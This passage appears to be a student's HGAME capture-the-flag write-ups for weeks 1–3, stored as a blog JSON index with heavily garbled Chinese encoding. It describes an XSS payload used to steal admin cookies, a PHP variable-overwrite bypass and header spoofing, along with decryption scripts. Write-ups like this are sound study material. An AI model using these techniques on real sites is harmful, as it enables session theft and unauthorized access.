å›ºï¼Œæƒ³è¦è„±å£³ï¼Œç”¨äº†å¾ˆå¤šç½‘ä¸ŠæŸ¥åˆ°çš„æ–¹æ³•ä½†éƒ½å¤±è´¥äº†ï¼Œé—®äº† Trotskyå­¦é•¿ï¼Œæ¨èä½¿ç”¨frida-dexdumpè„±å£³ï¼Œä½†æ˜¯å› ä¸ºè¿™é“é¢˜éœ€è¦rootè¿‡çš„çœŸæœºï¼ˆæ¨¡æ‹Ÿå™¨ä¸è¡Œï¼‰æ¥è¿›è¡Œè„±å£³ï¼Œæ‰€ä»¥æœ€ååªèƒ½æ”¾å¼ƒ â€‹ hello_re3æˆ‘æ²¡å¤ªææ˜ç™½ï¼Œæ‹–è¿›idaå‘ç°åº”è¯¥éƒ½æ˜¯è°ƒè¯•ä¿¡æ¯ï¼Œmezoneå­¦é•¿è¯´è¦ç”¨dbgviewçœ‹è°ƒè¯•ä¿¡æ¯å†å®šä½åˆ°ç¨‹åºé‡Œï¼Œå¯æƒœè¿™é¢˜æ˜¯æœ€åä¸€å¤©æ‰åšçš„ï¼Œæœ€åæ²¡æ—¶é—´äº†ï¼Œæ‰“ç®—çœ‹å®˜æ–¹writeupå†å­¦ä¹ ä¸€ä¸‹ Crypto â€‹ EncryptedChatsè¿™é¢˜å°è¯•äº†å„ç§æ–¹æ³•å»è§£ï¼Œè¿˜æ˜¯è§£ä¸å‡º a å’Œ b ï¼Œéœ€è¦çš„æ—¶é—´éƒ½å¾ˆé•¿ï¼Œä½†æ˜¯ g æŒºå¤§ï¼ˆä¸æ˜¯2ã€5è¿™ç§å¾ˆå°çš„ï¼‰ a è·Ÿ b åº”è¯¥æ˜¯èƒ½è§£å‡ºæ¥çš„â€¦","link":"/2021/03/27/HGAME-Week3-Writeup/"},{"title":"HGAME-Week2-Writeup","text":"week2 Web 1.LazyDogR4U â€‹ é¦–å…ˆæ‰“å¼€é¢˜ç›®åœ°å€ â€‹ æ ¹æ®é¢˜ç›®ç»™çš„hintï¼Œåœ¨åœ°å€æ åé¢åŠ ä¸Š /www.zip è·å¾—ç½‘é¡µæºç  â€‹ æ¥ç€æ‰“å¼€ lazy.php å’Œ flag.php è¿™ä¸¤ä¸ªphpæ–‡ä»¶ï¼Œå†æ ¹æ®å˜é‡è¦†ç›–çš„æç¤ºæ‰¾åˆ°æ¼æ´ç‚¹ â€‹ è¿™é‡Œåˆ’çº¿å¤„çš„ä¸¤ä¸ª$ç¬¦å·å®¹æ˜“å¯¼è‡´å˜é‡è¦†ç›–ï¼Œé‚£ä¹ˆæ ¹æ® flag.php ä¸­å¾—åˆ°flagçš„æ¡ä»¶å°±å¯ä»¥è¿›è¡Œæ„é€ ï¼Œç›¸å½“äºï¼š $_SESSSION[username]=admin â€‹ åŒå†™SESSIONæ˜¯å› ä¸ºä¸Šé¢str_replaceçš„è¿‡æ»¤ â€‹ å¾—åˆ°flag 2.Post to zuckonit â€‹ â€‹ ç‚¹å¼€åå‘ç°æ˜¯ç•™è¨€æ¿ï¼Œé¢˜ç›®ä¹Ÿå¾ˆæ˜ç¡®çš„æŒ‡å‡ºæ˜¯xssï¼Œé‚£ä¹ˆå°±å…ˆå°è¯•è¾“å…¥ scriptï¼Œiframeï¼Œimage â€‹ è¾“å…¥åå‘ç°ä¸ç®¡å¤§å°å†™ script éƒ½ä¼šè¢«è¿‡æ»¤æ‰ï¼Œå°å†™çš„ iframe ä¼šè¢«è¿‡æ»¤ï¼Œimageåˆ™ä¸ä¼šè¢«è¿‡æ»¤ â€‹ ä¹‹åå°è¯•è¾“å…¥ img src=1 onerror = alert(1) ï¼Œè®©é”™è¯¯çš„å›¾ç‰‡å¯¼è‡´å¼¹çª— â€‹ è¾“å‡ºäº†è¿™ä¹ˆä¸ªä¸œè¥¿ï¼ŒæŠŠè¿™ä¸ªè¾“å…¥å† post å°±ä¼šå¼¹çª—ï¼ŒæˆåŠŸå¼¹çª—ä¹‹åå°±æ˜¯æ‰¾ä¸€ä¸ª xss å¹³å°æ¥æ¥å— cookie ä¿¡æ¯ â€‹ æ ¹æ®ä¹‹å‰çš„è§„å¾‹ post å¹³å°ç»™çš„è¯­å¥ï¼Œå¹¶ç”¨è„šæœ¬å¾—å‡º md5 éªŒè¯ç æäº¤ï¼Œæ¥æ”¶åˆ° cookie ä¿¡æ¯ è„šæœ¬ï¼š 12345678910import hashlibdef md5(s): return hashlib.md5(s.encode()).hexdigest()def get_code(): code = 'XXXXXX' for i in range(10000000, 99999999): #8ä½md5 if md5(str(i)).startswith(code): return str(i)print(get_code()) â€‹ æ¥ç€å°±ä¼ªé€  admin cookie å¾—åˆ°flag Re 1.ezApk â€‹ å®‰å“é€†å‘ï¼Œç”¨ jadx åç¼–è¯‘ä¸º javaï¼Œæ‰¾åˆ° onClick äº‹ä»¶ â€‹ è¿™æ¡åˆ¤æ–­è¯­å¥æ˜¯å…³é”®ï¼Œåœ¨èµ„æºæ–‡ä»¶ä¸­æ‰¾åˆ°åŠ å¯†åçš„ flag å’Œ key â€‹ så‡½æ•°ç”¨æ¥åŠ å¯†è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œè½¬åˆ°så‡½æ•°åˆ†æ â€‹ ä»”ç»†åˆ†æåå¾—çŸ¥æ˜¯AES CBCæ¨¡å¼åŠ å¯†ï¼Œå¯†é’¥æ˜¯ä¹‹å‰çš„keyç»è¿‡sha-256åŠ å¯†å¾—åˆ°çš„ï¼Œivå‘é‡åˆ™æ˜¯keyç»è¿‡MD5åŠ å¯†å¾—åˆ°çš„ï¼Œæœ€åå°†åŠ å¯†ç»“æœå†è¿›è¡Œä¸€æ¬¡ base64 åŠ å¯†å¾—åˆ°ä¹‹å‰çš„ flag â€‹ å°è¯•ç”¨åœ¨çº¿ç½‘ç«™è§£å¯†ï¼Œä½†æ˜¯ç½‘ç«™ä¸€èˆ¬åªæ”¯æŒ 16 ä½ iv å€¼è§£å¯†ï¼Œæ²¡æœ‰åˆ«çš„åŠæ³•åªèƒ½ä¸œæ‹¼è¥¿å‡‘å†™å‡º java è„šæœ¬æ¥è§£å¯† 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051package com.company;import javax.crypto.Cipher;import javax.crypto.spec.IvParameterSpec;import javax.crypto.spec.SecretKeySpec;import java.security.MessageDigest;import java.security.NoSuchAlgorithmException;import java.util.Base64;public class Main { //md5,sha-256åŠ å¯† public static byte[] t(String str, String str2) { MessageDigest instance = null; try { instance = MessageDigest.getInstance(str); } catch (NoSuchAlgorithmException e) { e.printStackTrace(); } byte[] bytes = str2.getBytes(); byte[] digest = instance.digest(bytes); return digest; } //è§£å¯† public static String desEncrypt(String data, byte[] key) { byte[] ivString = t(&quot;MD5&quot;,&quot;A_HIDDEN_KEY&quot;); //ivå‘é‡ byte[] iv = ivString; try { byte[] encryp = Base64.getDecoder().decode(data); Cipher cipher = Cipher.getInstance(&quot;AES/CBC/PKCS7Padding&quot;); SecretKeySpec keySpec = new SecretKeySpec(key, &quot;AES&quot;); IvParameterSpec ivSpec = new IvParameterSpec(iv); cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec); byte[] original = cipher.doFinal(encryp); return new String(original); } catch (Exception e) { e.printStackTrace(); } return null; } public static void main(String[] args) { String data = &quot;EEB23sI1Wd9Gvhvk1sgWyQZhjilnYwCi5au1guzOaIg5dMAj9qPA7lnIyVoPSdRY&quot;; //å¯†æ–‡ byte[] key =t(&quot;SHA-256&quot;,&quot;A_HIDDEN_KEY&quot;); //å¯†é’¥ String desencrypt = desEncrypt(data, key); System.out.println(&quot;è§£å¯†å:&quot;+desencrypt); }} â€‹ å› ä¸ºè¦ç”¨åˆ°çš„æ˜¯AES 256ä½è§£å¯†ï¼Œè€Œ java æœ¬èº«åªæ”¯æŒ 128ä½ AES è§£å¯†ï¼Œæ‰€ä»¥å°±è¦åšå…¶ä»–çš„ä¸€äº›é…ç½®æ‰èƒ½è§£å¯† 2.helloRe2 â€‹ æ‹–è¿› IDA åˆ†æï¼Œä¹ä¸€çœ‹ç»“æ„æœ‰ç‚¹å¤æ‚ï¼Œpassword1 çš„åˆ¤æ–­åœ¨ååŠéƒ¨åˆ†ï¼Œè€Œpassword2 çš„åˆ¤æ–­åœ¨å‰åŠéƒ¨åˆ†ï¼Œå…ˆåˆ†æ password1 â€‹ å…³é”®éƒ¨åˆ†æ˜¯è¿™æ¡åˆ¤æ–­ï¼Œåˆ¤æ–­è¾“å…¥çš„passwordé•¿åº¦å’Œ password ç»è¿‡ä¸€ç³»åˆ—æ“ä½œåçš„ç»“æœï¼Œç”¨ ollydbg è°ƒè¯•å¹¶ä¸æ–­çŒœæµ‹ï¼Œå¾—çŸ¥è¿™ä¹ˆä¸€ç³»åˆ—æ“ä½œå°±æ˜¯åˆ¤æ–­è¾“å…¥çš„å­—ç¬¦ä¸²æ˜¯å¦æ˜¯ç»™å‡ºçš„å¯†æ–‡çš„é€†åº â€‹ ä¹‹åå†åˆ†æ pwd2 â€‹ åº”è¯¥åˆæ˜¯AES CBC æ¨¡å¼åŠ å¯†ï¼Œæ‰¾åˆ° iv å’Œ å¯†é’¥ï¼Œå¯†é’¥æ˜¯pwd1ç»è¿‡å¼‚æˆ–å¾—åˆ°ï¼Œå¯†æ–‡æ˜¯å·²ç»ç»™å‡ºå¯†æ–‡çš„é€†åº ![](D:\\HGAME2021\\HGAME week2\\re2(4).png) â€‹ è§£å¯†å°±ç”¨ä¸Šä¸€é¢˜çš„è„šæœ¬ â€‹ è¿™é‡Œçœ‹ç€åƒæ˜¯ä¸¤æ¬¡åŠ å¯†ï¼Œä½†å…¶å®åªæœ‰ä¸€æ¬¡ 3.fake_debugger beta â€‹ ncé¢˜ç›®åœ°å€ï¼Œå‘ç°åªæœ‰åœ¨ ebx ç»è¿‡ä¸€æ¬¡è½¬æ¢åä¸ eax ç›¸ç­‰æ‰èƒ½ç»§ç»­è°ƒè¯•ï¼Œä¹‹åä¸æ–­è°ƒè¯•å‘ç° â€‹ è½¬æ¢å‰çš„ ebx ä¸ eax å¼‚æˆ–åå°±æ˜¯ flag ä¸­çš„å­—ç¬¦ï¼Œé‚£å°±ä¸€ä¸ªä¸ªè°ƒè¯•ä¸‹æ¥å¾—åˆ° flag Crypto 1.gcd or more? â€‹ â€‹ çœ‹ç€åƒæ˜¯RSAï¼Œä½†æ˜¯e = 2ã€‚ç™¾åº¦åæŸ¥åˆ°ä½æŒ‡æ•°çˆ†ç ´ï¼Œä¹‹ååˆçœ‹åˆ°Rabinç®—æ³•ï¼Œç‰¹å¾æ˜¯e = 2 ï¼Œé‚£ä¹ˆå°±ç”¨è¿™ä¸ªè„šæœ¬è§£é¢˜ 12345678910111213141516171819202122import gmpy2import libnume = 2p = 85228565021128901853314934583129083441989045225022541298550570449389839609019q = 111614714641364911312915294479850549131835378046002423977989457843071188836271n = p * qc = 7665003682830666456193894491015989641647854826647177873141984107202099081475984827806007287830472899616818080907276606744467453445908923054975393623509539#c= int(open('./flag.enc','rb').read().encode('hex'),16)mp = pow(c, (p + 1) // 4, p)mq = pow(c, (q + 1) // 4, q)yp = gmpy2.invert(p, q)yq = gmpy2.invert(q, p)r = (yp * p * mq + yq * q * mp) % nrr = n - rs = (yp * p * mq - yq * q * mp) % nss = n - sprint(libnum.n2s(int(r)))print(libnum.n2s(int(rr)))print(libnum.n2s(int(s)))print(libnum.n2s(int(ss))) 2.WhitegiveRSA â€‹ â€‹ å·²çŸ¥Nï¼Œé‚£å°±æ‹¿åˆ°åœ¨çº¿ç½‘ç«™é‡Œåˆ†è§£å‡ºå¤§ç´ æ•° q å’Œ pï¼Œå‰©ä¸‹æ¥éƒ½å·²çŸ¥å°±ç”¨è„šæœ¬è§£å¯† Misc 1.Tools â€‹ ä¸‹è½½è§£å‹å¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…å’Œä¸€å¼ å›¾ç‰‡ï¼Œæ ¹æ®é¢˜ç›®çš„ tools å’Œå‹ç¼©åŒ…å f5 å°è¯•ç”¨ f5 å·¥å…·ç ´è§£å‹ç¼©åŒ…å¯†ç ï¼Œç ´è§£æ‰€éœ€çš„å¯†ç åœ¨å›¾ç‰‡çš„è¯¦ç»†ä¿¡æ¯ä¸­ â€‹ æ‰“å¼€åŠ å¯†å‹ç¼©åŒ…åå‘ç°ä¸€éƒ¨åˆ†äºŒç»´ç å’Œå‹ç¼©åŒ…ï¼Œæ¥ç€å°±æ˜¯åƒä¹‹å‰é‚£æ ·æ‰¾åˆ°å‹ç¼©åŒ…åé‡Œçš„å·¥å…·è§£å¯†ï¼Œæœ€ç»ˆé›†é½4å¼ äºŒç»´ç ç¢ç‰‡ï¼Œç”¨win10è‡ªå¸¦çš„ç”»å›¾å·¥å…·æ‹¼åˆï¼Œæ‰«ç å¾—flag 2.Telegraphï¼š1601 6639 3459 3134 0892 â€‹ é¢˜ç›®ä¸ºéŸ³é¢‘éšå†™ï¼Œåˆæåˆ°å¬ç€åèƒƒï¼Œäºæ˜¯çŒœæµ‹æ˜¯æ‘©æ–¯ç”µç ã€‚å¬äº†ä¹‹åï¼Œä¸­é—´æœ‰ä¸€æ®µå˜€å—’å£°ï¼Œè¿™ä¸€æ®µå°±æ˜¯éœ€è¦æ‘©æ–¯è§£å¯†çš„éƒ¨åˆ†ï¼Œæ¥ç€æŠŠéŸ³é¢‘æ‹–åˆ° Audacity é‡Œé¢åˆ†æ â€‹ é¦–å…ˆçœ‹ä¸€ä¸‹é¢‘è°±å›¾ â€‹ å¾—åˆ°850hzçš„æç¤ºï¼Œä¹‹åå°è¯•ç¿»è¯‘æ‘©æ–¯ç”µç ï¼Œå‘ç°ä¸­é—´æœ‰ä¸€æ®µæ— æ³•è¾¨è®¤å°±æƒ³åˆ°è¦æ»¤æ³¢ï¼Œç”¨çš„æ˜¯ä¸Šé¢çš„æç¤º â€‹ çª„çš„æ˜¯**.** å®½çš„æ˜¯**-** ï¼Œç¿»è¯‘åè§£å¯†å°±å¾—åˆ°flag 3.Hallucigenia â€‹ åªç»™äº†ä¸€å¼ å›¾ï¼Œé‚£ä¹ˆå°±å…ˆç”¨ Stegsolve å·¦å³è°ƒä¸€ä¸‹å¾—åˆ°äºŒç»´ç  â€‹ æ‰«ç å¾—åˆ°ä¸€ä¸² base64 è§£ç å‘ç°æœ€åæ˜¯ GNP ï¼Œæ ¹æ®é¢˜ç›®ä¸­ **â€œæˆ‘ä»¬ä¸ä»…å¼„é”™äº†ä»–çš„ä¸Šä¸‹ï¼Œè¿˜é¢ å€’äº†å®ƒçš„å·¦å³ã€‚â€ **é€†åºå¤„ç†åç²˜è´´åˆ°winhexä¿å­˜ä¸ºå›¾ç‰‡ â€‹ å‘ç°åˆæ˜¯ä¸Šä¸‹å·¦å³é¢ å€’ï¼Œå€’å›æ¥å°±å¾—flag 4.DNS â€‹ æµé‡åŒ…åˆ†æï¼Œç­›é€‰ dns å¾—åˆ°ä¸€ä¸²åŸŸåå¹¶è®¿é—® â€‹ æŠ“åŒ…å¾— â€‹ æŸ¥ä¸€ä¸‹ SPF çŸ¥é“æ˜¯ä¸€ç§ dns è®°å½•ï¼Œé‚£å°±ç”¨åœ¨çº¿ç½‘ç«™æŸ¥ä¸€ä¸‹dnsè®°å½•ï¼Œå¾—åˆ°flag æ€»ç»“ï¼š â€‹ è¿™å‘¨æ¯”è¾ƒæ‘¸é±¼ï¼Œweb èƒ½åšå‡ºä¸¤é“æ˜¯å› ä¸ºç»™äº†å…·ä½“çš„è€ƒç‚¹ï¼Œå‚ç…§å¾€å¹´ writeup ä¸€ç‚¹ç‚¹åšä¸‹æ¥ã€‚ re åšäº†å¾ˆä¹…ï¼Œå› ä¸ºä¹‹å‰æ²¡æœ‰æ¥è§¦è¿‡ apk é€†å‘ï¼Œå¯¹ aes åŠ å¯†ä¹Ÿä¸å¤ªäº†è§£ï¼Œæœ€åèƒ½å…¨éƒ¨åšå‡ºæ¥çœŸæ˜¯å¤ªå¥½äº†ï¼Œé€†å‘çš„æ—¶å€™æœç„¶æ˜¯è¦æŠ“é‡ç‚¹ï¼Œè§£å®Œé¢˜åæ‰å‘ç°å…¶å®æŒºç®€å•çš„ã€‚ å¯†ç å­¦æ˜¯çœŸä¸å¤ªè¡Œï¼Œè¿™å‘¨ pwn ä¹ŸåŸºæœ¬æ²¡çœ‹ï¼ŒMisc å€’æ˜¯åšçš„æŒºé¡ºç•…çš„ï¼Œä¸‹å‘¨è¦è¯•ç€æŠŠä¹‹å‰çš„çŸ¥è¯†æ¡èµ·æ¥äº†","link":"/2021/03/27/HGAME-Week2-Writeup/"},{"title":"HGAME-Week1-writeup","text":"week1 1.web 1.Hitchhiking_in_the_Galaxy â€‹ ç½‘é¡µf12å‘ç° /HitchhikerGuide.php , æŠ“åŒ…å‘ç° 302, äºæ˜¯åœ¨ Linux ä¸­ç”¨ curl å‘½ä»¤è®¿é—®è¿™é‡Œ,å‘ç° 405 é‚£ä¹ˆå°±æ”¹ç”¨ post è¯·æ±‚æ–¹å¼ â€‹ åˆšå¼€å§‹çœ‹åˆ°è¿™å¥è¯åæ²¡æœ‰ä¸€ç‚¹æƒ³æ³•,å°±å»çœ‹äº†çœ‹å‘çš„å­¦ä¹ èµ„æ–™,çœ‹åˆ° user-agent åæ„è¯†åˆ°åº”è¯¥æ˜¯è¦åŠ è¿™ä¸ªå¤´ (å› ä¸ºå¼•æ“) , å†…å®¹æ˜¯é‚£ä¸²è‹±æ–‡ â€‹ ä»…èƒ½é€šè¿‡æœ¬åœ°è®¿é—® , é‚£ä¹ˆå°±å†åŠ ä¸€ä¸ª x-forwarded-for å¤´ , æœ€åè¯´è¦ä»èŒ„å­å­¦é•¿çš„ç½‘ç«™è¿‡æ¥ , å†åŠ ä¸€ä¸ª referer å¤´,å¾—åˆ° flag 2.watermelon â€‹ æ‰“å¼€ç½‘é¡µå‘ç°æ˜¯åˆæˆå¤§è¥¿ç“œ, ç©äº†ä¸€éå‘ç°è¦è¾¾åˆ°2000åˆ†æ‰èƒ½å¾—åˆ°flag, äºæ˜¯æ¯«ä¸çŠ¹è±«åœ°æŠ“åŒ…(å¯æƒœæ¥å—ä¸åˆ°åˆ†æ•°,æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä¹Ÿä¸æ¸…æ¥š) æŠ“åŒ…ä¸è¡Œé‚£ä¹ˆå°±åªèƒ½ä¿®æ”¹ js ä»£ç ,ç„¶è€Œåœ¨æˆ‘è¯•å›¾ä¿®æ”¹çš„è¿‡ç¨‹ä¸­å‘ç° â€‹ æŠŠç½‘é¡µå˜æˆè¿™æ ·å°±èƒ½è½»æ¾ç©åˆ°2000åˆ†! (åˆ°åº•æ€ä¹ˆæ”¹jsä»£ç æˆ‘ä¸å¤ªæ¸…æ¥š,åº”è¯¥æ˜¯è¦æ‰¾åˆ°å­˜å‚¨åˆ†æ•°çš„å˜é‡,ç„¶ååœ¨ console é‡Œä¿®æ”¹â€¦) â€‹ å¾—åˆ° flag 3.å®è—èµ°ç§è€… â€‹ å…ˆæ‹¿ç€å­¦ä¹ èµ„æ–™å­¦ä¹ äº†ä¸€ä¸‹,ä¹‹åç‚¹å¼€ç½‘é¡µç‚¹å‡» secret data è·³è½¬åˆ°å¦ä¸€ä¸ªç•Œé¢,æç¤ºè¦æ˜¯ localhost ,äºæ˜¯åŠ äº† host å¤´ â€‹ æ„å¤–çš„å°±å¾—åˆ°äº† flag (ä¸çŸ¥é“æ€ä¹ˆå¾—åˆ°çš„, å¥½åƒè·Ÿå­¦ä¹ èµ„æ–™æ— å…³?) 4.æ™ºå•†æ£€æµ‹é¸¡ â€‹ ç”¨ firefox æµè§ˆå™¨æ‰“å¼€ç½‘é¡µå‘ç°è¦åš100é“å®šç§¯åˆ†æ‰èƒ½å¾—åˆ° flag, f12çœ‹åˆ°ç½‘é¡µæºä»£ç ,é‡Œé¢æœ‰ä¸ª getflag() å‡½æ•° â€‹ åœ¨ console è¾“å…¥å,å¼¹å‡ºä¸€å¥è¯(æ˜¯å•¥æˆ‘å¿˜äº†) , å¾—çŸ¥è¿™æ ·ä¸è¡Œ,äºæ˜¯æˆ‘å°±æ­é…å®šç§¯åˆ†è®¡ç®—å™¨è§£å®Œäº†è¿™100é¢˜,å¾—åˆ° flag (ä¹‹åçœ‹r4uå­¦é•¿å‘çš„å­¦ä¹ èµ„æ–™,è§‰å¾—åº”è¯¥æ˜¯ python çˆ¬è™«ä¸€ç±»çš„,å¯æƒœæˆ‘ python è¿˜ä¸å¤ªä¼š,åªèƒ½æ‰‹åŠ¨è§£é¢˜äº†) web æ€»ç»“: web å¼€å§‹çš„æ—¶å€™æ˜¯çœŸçš„ä¸€ç‚¹éƒ½ä¸ä¼š, watermelon å’Œå®šç§¯åˆ†éƒ½ä¸æ˜¯é€šè¿‡ web çŸ¥è¯†è§£çš„, burp ä¹Ÿæ˜¯å‰å‡ å¤©åˆšè£…çš„(å®‰è£…èŠ±äº†ä¸€å¤©â€¦),æ€»ä¹‹å­¦åˆ°äº†å¾ˆå¤š 2.reverse 1.apacha â€‹ åº”è¯¥æ˜¯è¿™å‘¨ reé‡Œæœ€éš¾çš„ï¼ˆä½†å…¶å®ä¹Ÿä¸æ˜¯å¤ªéš¾ï¼‰ï¼Œé¦–å…ˆç”¨ ida æ‰“å¼€æ–‡ä»¶å¹¶åˆæ­¥åˆ†æ â€‹ å…³é”®éƒ¨åˆ†åœ¨ç¬¬25å’Œç¬¬26è¡Œçš„ä¸¤ä¸ªå‡½æ•° â€‹ ç¬¬ä¸€ä¸ªå…³é”®å‡½æ•°ï¼Œåˆšå¼€å§‹çœ‹è§‰å¾—æŒºå¤æ‚çš„åæ¥å‘ç°äº† tea å‹åŠ å¯†ç®—æ³•çš„ç‰¹å¾ï¼ŒæŸ¥èµ„æ–™çŒœæµ‹è¿™åº”è¯¥æ˜¯ xxtea åŠ å¯†ç®—æ³• â€‹ ç¬¬äºŒä¸ªå…³é”®å‡½æ•°ï¼Œåˆ¤æ–­è¾“å…¥æ˜¯å¦ä¸º flag ã€‚åŠ å¯†åçš„ flagå­˜åœ¨unk_501C , æ¯å››ä¸ªå­—èŠ‚ä¸€ç»„ â€‹ ä¹‹åå°±æ˜¯å†™è„šæœ¬è§£å¯†ï¼Œäºæ˜¯åœ¨ç½‘ä¸Šæ‰¾äº†ä¸€ä¸ªç°æˆçš„è„šæœ¬ï¼ˆ cè¯­è¨€ï¼‰ï¼Œæ”¹äº†ä¸€ä¸‹å°±å¾—åˆ° flagï¼ˆè¿™é‡Œæœ‰ä¸ªåœ°æ–¹éœ€è¦æ³¨æ„ï¼Œå› ä¸ºæ˜¯å°ç«¯åºæ‰€ä»¥ ida ä¸­åŠ å¯†çš„æ•°æ®æ¯å››ä¸ªå­—èŠ‚è¦é€†åºæ‰æ˜¯çœŸæ­£çš„åŠ å¯†æ•°æ®ï¼‰ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#define tea_DELTA 0x9e3779b9#define xxtea_MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))void xxtea(uint32_t* origin, int n, uint32_t const key[4]);int main(){ unsigned int data[] = { 0xE74EB323,0xB7A72836,0x59CA6FE2,0x967CC5C1,0xE7802674 ,0x3D2D54E6,0x8A9D0356,0x99DCC39C,0x7026D8ED,0x6A33FDAD, 0xF496550A,0x5C9C6F9E,0x1BE5D04C,0x6723AE17,0x5270A5C2, 0xAC42130A,0x84BE67B2,0x705CC779,0x5C513D98,0xFB36DA2D, 0x22179645,0x5CE3529D,0xD189E1FB,0xE85BD489,0x73C8D11F,0x54B5C196, 0xB67CB490,0x2117E4CA,0x9DE3F994,0x2F5AA1AA,0xA7E801FD,0xC30D6EAB, 0x1BADDC9C,0x3453B04A,0x92A406F9 }; int i, j;uint32_t* encode = (uint32_t*)data; uint32_t const key[4] = {1,2,3,4}; xxtea(encode, -35, key); for (i = 0; i &lt; 35; i++) printf(&quot;%d,&quot;, data[i]);}void xxtea(uint32_t* origin, int n, uint32_t const key[4]){ uint32_t y, z, sum; unsigned p, rounds, e; if (n &gt; 1) /* Coding Part */ { rounds = 6 + 52 / n; sum = 0; z = origin[n - 1]; do { sum += tea_DELTA; e = (sum &gt;&gt; 2) &amp; 3; for (p = 0; p &lt; n - 1; p++) { y = origin[p + 1]; z = origin[p] += xxtea_MX; } y = origin[0]; z = origin[n - 1] += xxtea_MX; } while (--rounds); } else if (n &lt; -1) /* Decoding Part */ { n = -n; rounds = 6 + 52 / n; sum = rounds * tea_DELTA; y = origin[0]; do { e = (sum &gt;&gt; 2) &amp; 3; for (p = n - 1; p &gt; 0; p--) { z = origin[p - 1]; y = origin[p] -= xxtea_MX; } z = origin[n - 1]; y = origin[0] -= xxtea_MX; sum -= tea_DELTA; } while (--rounds); }} 2.helloRe â€‹ è¿™é¢˜ä¸éš¾ï¼Œåªæ˜¯æœ‰ç‚¹ c++ çš„è¯­æ³•ï¼ŒåŒæ · ida ![](HGAME-Week1-writeup/reverse2 .png) â€‹ å…³é”®åœ¨ä¸­é—´çš„å¼‚æˆ–æ“ä½œï¼Œå†™ä¸ªè„šæœ¬å°±èƒ½å¾—åˆ°ç»“æœ 3.pypy â€‹ è¿™é¢˜è€ƒçš„æ˜¯ python å­—èŠ‚ç ï¼Œåˆšå¼€å§‹çœ‹çš„æ—¶å€™è¿˜ä¸å¤ªæ‡‚pythonè¯­æ³•èŠ±äº†ç‚¹æ—¶é—´å»ç†è§£ï¼Œé€šè¿‡ dis æ–‡æ¡£æ¥åˆ†ææ¯ä¸€æ¡è¯­å¥ï¼Œå¤§æ¦‚è¿˜åŸäº†ä¸€ä¸‹ â€‹ ç†è§£ä¹‹åå°±æ˜¯ç”¨è„šæœ¬è§£é¢˜ï¼Œå†åŠ ä¸Š hgame{} ï¼ˆåˆšå¼€å§‹äº¤çš„æ—¶å€™å¿˜åŠ äº†ï¼‰ 3.pwn 1.whitegive â€‹ ä¸‹è½½ï¼Œåœ¨ Linux ä¸­ç”¨ gdb è°ƒè¯•ï¼Œå¾—çŸ¥è¾“å…¥æ•°å­—åœ¨æ ˆä¸­çš„çš„å­˜å‚¨ä½ç½®ä¸º 0x7ffffffffde50 ![](HGAME-Week1-writeup/pwn1 (3).png) â€‹ ç»§ç»­è°ƒè¯•ï¼Œå‘ç°æœ€å if è¯­å¥æ¯”è¾ƒçš„æ˜¯ rax å’Œ rdx çš„å€¼ï¼Œè€Œæ­¤æ—¶ rax å­˜å‚¨çš„æ˜¯ â€˜paSsw0rdâ€™ å­—ç¬¦ä¸²çš„åœ°å€ï¼Œé‚£ä¹ˆåªè¦è¾“å…¥è¿™ä¸ªåœ°å€çš„åè¿›åˆ¶å€¼å°±èƒ½ä½¿æ¡ä»¶æˆç«‹ ![](HGAME-Week1-writeup/pwn1 (2).png) ![](HGAME-Week1-writeup/pwn1 (4).png) â€‹ ncè¿æ¥ï¼Œcat flagï¼ˆçš„ç¡®æŒºç™½ç»™çš„ï¼Œæ¯•ç«Ÿæˆ‘éƒ½èƒ½åšï¼‰ pwn æ€»ç»“ï¼šæˆ‘ä¹Ÿå¤ªèœäº†åªè§£å‡ºç™½ç»™é¢˜ ,çœ‹äº†æœ€åä¸€é¢˜ä½†ä¸å¤ªä¼š rop , æ€»ä¹‹è¿™å‘¨å°±ç¨å¾®å­¦ä¹ äº†ä¸€ä¸‹æ€ä¹ˆå†™ pwn çš„è„šæœ¬å’Œä¸€äº›åŸºç¡€çŸ¥è¯†ä»¥åŠå®‰è£…å·¥å…· 4.crypto 2.å¯¹ç§°ä¹‹ç¾ â€‹ æ‰“å¼€é“¾æ¥ä¸‹è½½ python æ–‡ä»¶ â€‹ key æ˜¯åœ¨ ascii å­—æ¯å’Œæ•°å­—é‡Œéšæœºé€‰å–16ä¸ªç»„æˆï¼Œè€Œ cipher æ˜¯ç”±æ˜æ–‡ä¸å¾ªç¯çš„ key å¼‚æˆ–å¾—åˆ°çš„å¯†æ–‡ â€‹ æ ¹æ®å¼‚æˆ–ç‰¹æ€§çŸ¥é“å¯†æ–‡ä¸å¾ªç¯çš„ key å¼‚æˆ–å°±æ˜¯æ˜æ–‡ï¼Œé‚£ä¹ˆè¿™é“é¢˜é‡ç‚¹å°±æ˜¯æ±‚å‡ºä¸€ç»„ key ã€‚å¤šæ¬¡ä¸‹è½½é™„ä»¶å‘ç° cipher å„ä¸åŒï¼Œé‚£å°±åˆ©ç”¨å¤šä¸ªå¯†æ–‡å†™è„šæœ¬çˆ†ç ´å¾—åˆ°å‰16ä½æ˜æ–‡ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849table = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;de0 = []c = []for i in range(0,130): c.append(0)flag = []#for i in range(0, 16):for j in range(0, 62): de0.append(xor(cipher0[15], table[j])) de0.append(xor(cipher1[15], table[j])) de0.append(xor(cipher2[15], table[j])) de0.append(xor(cipher3[15], table[j])) de0.append(xor(cipher4[15], table[j])) de0.append(xor(cipher5[15], table[j])) de0.append(xor(cipher6[15], table[j])) de0.append(xor(cipher7[15], table[j])) de0.append(xor(cipher8[15], table[j])) de0.append(xor(cipher9[15], table[j])) de0.append(xor(cipher10[15], table[j])) de0.append(xor(cipher11[15], table[j])) de0.append(xor(cipher12[15], table[j])) de0.append(xor(cipher13[15], table[j])) de0.append(xor(cipher14[15], table[j])) de0.append(xor(cipher15[15], table[j])) de0.append(xor(cipher16[15], table[j])) de0.append(xor(cipher17[15], table[j])) de0.append(xor(cipher18[15], 